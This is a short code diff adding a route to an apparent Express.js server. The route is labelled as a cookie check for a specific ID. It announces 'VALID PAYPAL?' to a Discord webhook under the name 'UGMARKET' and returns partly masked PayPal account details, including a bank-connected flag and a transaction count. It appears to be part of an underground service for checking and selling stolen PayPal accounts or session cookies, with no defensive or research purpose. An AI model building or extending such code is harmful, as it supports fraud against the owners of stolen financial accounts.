@@ -666,6 +666,17 @@ app.get('/check_cookie/id=59329/r', async (req, res) => {
     res.json(randomObject);
 });
 
+app.get('/check_cookie/id=43958/r', async (req, res) => {
+  const message = {
+      username: "UGMARKET",
+      avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583378577391616/invert-ug.png",
+      content: "VALID PAYPAL? @everyone"
+  };
+  await sendWebhookMessage(message);
+    const Robject = {"name": "Joshua ****", "email": "j***1@gmail.com", "bank_connected": "true", "transaction": "211", "age": "08/11/2019"}
+    res.json(Robject);
+});
+
 
 
 app.listen(process.env.PORT || 3000)
